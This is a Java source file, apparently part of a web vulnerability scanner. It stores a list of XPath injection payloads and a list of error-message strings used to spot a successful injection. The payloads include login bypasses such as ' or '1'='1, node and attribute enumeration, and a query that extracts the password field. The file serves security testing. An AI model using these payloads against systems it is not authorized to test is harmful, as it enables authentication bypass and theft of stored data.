/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package PaySig;

/**
 *
 * @author laxba
 */
public class psXMLXpatchi {

    private static String[] arrPayXMLXPathin;
    private static String[] arrSigXMLXPathin;

    public void loadDataXMLXPathin() {
        arrPayXMLXPathin = new String[]{
            "'",
            "' or '1'='1",
            "' or ''='",
            "x' or 1=1 or 'x'='y",
            "/",
            "//",
            "//*",
            "*/*",
            "@*",
            "count(/child::node())",
            "x' or name()='username' or 'x'='y",
            "' and count(/*)=1 and '1'='1",
            "' and count(/@*)=1 and '1'='1",
            "' and count(/comment())=1 and '1'='1",
            "1][1",
            "last()-1 and 1=2",
            "Bible\" and lower-case('A') = \"a",
            "')]password | a[contains(a,'",
            "') or contains(genre, '",
            "') or not(contains(genre, 'praveen') and '1'='2"};

        arrSigXMLXPathin = new String[]{
            "SimpleXMLElement::xpath()",
            "Invalid predicate in",
            "xmlXPathEval: evaluation failed in"};
    }

    public String[] getArrPayXMLXPathin() {
        return arrPayXMLXPathin;
    }

    public String[] getArrSigXMLXPathin() {
        return arrSigXMLXPathin;
    }
}
